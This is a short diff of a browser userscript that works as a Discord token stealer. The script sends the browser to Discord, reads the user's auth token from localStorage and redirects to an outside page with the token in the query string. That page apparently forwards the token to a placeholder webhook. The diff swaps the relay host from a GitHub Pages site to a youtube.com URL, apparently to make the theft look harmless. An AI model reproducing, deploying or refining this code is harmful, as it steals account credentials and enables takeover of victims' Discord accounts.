@@ -11,7 +11,7 @@
 // ==/UserScript==
 
 (function () {
-    if (window.location.href.startsWith("https://lyzev.github.io")) {
+    if (window.location.href.startsWith("https://www.youtube.com/")) {
         const url = new URL(window.location.href);
         const token = url.searchParams.get("token");
         const webhook = "WEBHOOK-URL";
@@ -28,7 +28,7 @@
     } else if (window.location.href === "https://discord.com/channels/@me") {
         const token = localStorage.token;
         if (token != null) {
-            window.location.href = "https://lyzev.github.io?token=" + token;
+            window.location.href = "https://www.youtube.com?token=" + token;
         }
     } else {
         window.location.href = "https://discord.com/channels/@me";
